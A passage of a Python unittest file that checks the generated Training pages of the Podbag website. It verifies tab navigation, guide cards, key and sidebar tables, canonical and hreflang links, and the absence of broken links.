        """Every Training page starts with three tabs: how to use the GUI (/training/gui/),
        GUI practice (/training/) and how to use the TUI (/training/tui/). The open one is
        marked."""
        for code, _ in self.site.LANGS:
            words = json.loads((self.site.SITE / f"i18n/{code}.json").read_text())
            base = self.out / self.site.path_of(code) / "training"
            pages = [base / "gui/index.html", base / "index.html", base / "tui/index.html"]
            for current, page in enumerate(pages):
                with self.subTest(code=code, page=page.relative_to(self.out)):
                    html = page.read_text()
                    nav = re.search(r'<nav class="band-nav"[^>]*>(.*?)</nav>', html).group(1)
                    tabs = re.findall(r'<a href="([^"]+)"( aria-current="page")?>([^<]+)</a>', nav)
                    self.assertEqual([t[2] for t in tabs],
                                     [words["training_tab_gui_usage"], words["training_tab_gui"],
                                      words["training_tab_tui"]])
                    self.assertEqual([(page.parent / t[0]).resolve() for t in tabs],
                                     [p.parent.resolve() for p in pages])
                    self.assertEqual([bool(t[1]) for t in tabs], [n == current for n in range(3)])

    def test_the_usage_pages_list_every_guide_as_a_card(self):
        """/training/gui/ and /training/tui/ list their guides in order as cards like the blog
        list: the guide's picture, the title linking to the guide in the page's language, its
        time and summary. They have no practice module."""
        posts = HERE.parents[1] / "site/blog/posts"
        for (kind, usage), (code, _) in itertools.product(USAGE.items(), self.site.LANGS):
            page = self.out / self.site.path_of(code) / f"training/{kind}/index.html"
            html = page.read_text()
            self.assertNotIn("podbag lab", html)
            self.assertEqual(re.findall(r'<li class="post-card guide reveal" id="([a-z0-9-]+)">', html),
                             usage["guides"], code)
            for slug in usage["guides"]:
                with self.subTest(code=code, slug=slug):
                    item = re.search(rf'<li class="post-card guide reveal" id="{slug}">(.*?)</li>',
                                     html).group(1)
                    self.assertTrue(item.startswith('<a class="thumb"'), item[:80])
                    text = (posts / slug / f"{code}.md").read_text()
                    image = re.search(r'^image: "?(.*?)"?$', text, re.M).group(1)
                    src = re.search(r'<img src="([^"]+)"', item).group(1)
                    self.assertEqual(Path(src).parts[-3:], ("blog", slug, image))
                    self.assertTrue((page.parent / src).is_file(), src)
                    href = re.search(r'<h3 class="post-title"><a href="([^"]+)">', item).group(1)
                    self.assertEqual((page.parent / href).resolve(),
                                     (self.out / self.site.path_of(code) / "blog" / slug).resolve())
                    self.assertTrue((page.parent / href / "index.html").is_file())
                    title = re.search(r'^title: "?(.*?)"?$', text, re.M).group(1)
                    self.assertIn(html_text(training.short_title(title)), html_text(item))
                    summary = re.search(r'^summary: "?(.*?)"?$', text, re.M).group(1)
                    words = re.sub(r"[`*]", "", summary).split()[:3]
                    self.assertIn(" ".join(words), html_text(item))
                    self.assertIn(str(usage["minutes"][slug]), html_text(item))

    def test_the_tui_page_starts_the_tui(self):
        for code, _ in self.site.LANGS:
            html = (self.out / self.site.path_of(code) / "training/tui/index.html").read_text()
            self.assertIn("podbag tui</code>", html)

    def test_the_gui_page_links_to_the_app(self):
        """/training/gui/ says where to get Podbag Desktop."""
        for code, _ in self.site.LANGS:
            html = (self.out / self.site.path_of(code) / "training/gui/index.html").read_text()
            intro = re.search(r'<div class="training"><p>(.*?)</p>', html).group(1)
            self.assertIn('href="https://github.com/SteelCrab/podbag/releases/latest"', intro, code)

    def test_the_gui_page_shows_the_sidebar(self):
        """/training/gui/ names each page of the sidebar with Podbag Desktop's own words."""
        for code, _ in self.site.LANGS:
            html = (self.out / self.site.path_of(code) / "training/gui/index.html").read_text()
            table = re.search(r'<table class="keys pages">(.*?)</table>', html, re.S).group(1)
            rows = re.findall(r"<tr><td>(.*?)</td><td>(.*?)</td></tr>", table)
            self.assertEqual(len(rows), len(GUI["pages"]), code)
            for (name, what), row in zip(rows, GUI["pages"]):
                self.assertEqual(html_text(name), row["names"][code])
                self.assertEqual(html_text(what), row["words"][code])

    def test_the_tui_page_shows_the_main_keys(self):
        for code, _ in self.site.LANGS:
            html = (self.out / self.site.path_of(code) / "training/tui/index.html").read_text()
            table = re.search(r'<table class="keys">(.*?)</table>', html, re.S).group(1)
            rows = re.findall(r"<tr><td>(.*?)</td><td>(.*?)</td></tr>", table)
            self.assertEqual(len(rows), len(TUI["keys"]), code)
            for (keys, what), row in zip(rows, TUI["keys"]):
                self.assertEqual(re.findall(r"<kbd>(.*?)</kbd>", keys),
                                 [html_escape(k) for k in row["keys"]])
                self.assertEqual(html_text(what), row["words"][code])

    def test_the_usage_pages_name_each_other(self):
        for kind, (code, _) in itertools.product(USAGE, self.site.LANGS):
            html = (self.out / self.site.path_of(code) / f"training/{kind}/index.html").read_text()
            url = f"https://podbag.dev/{self.site.path_of(code)}training/{kind}/"
            self.assertIn(f'<link rel="canonical" href="{url}">', html)
            for other, _ in self.site.LANGS:
                self.assertIn(f'<link rel="alternate" hreflang="{other}" '
                              f'href="https://podbag.dev/{self.site.path_of(other)}training/{kind}/">',
                              html)

    def test_no_broken_links(self):
        problems, _ = check_links.check(self.out)
        self.assertEqual(problems, [])


if __name__ == "__main__":
    unittest.main()
